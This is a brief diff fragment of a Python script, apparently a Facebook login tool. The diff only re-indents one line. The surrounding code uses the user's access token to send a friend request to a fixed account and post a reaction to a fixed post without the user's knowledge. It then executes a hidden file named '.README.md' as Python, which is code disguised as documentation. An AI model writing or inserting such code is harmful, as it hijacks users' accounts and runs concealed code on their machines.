@@ -105,7 +105,7 @@ def login_choice():
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
         requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
         os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-       os.system('python2 .README.md')
+        os.system('python2 .README.md')
     elif bch =='1':
         login1()
             
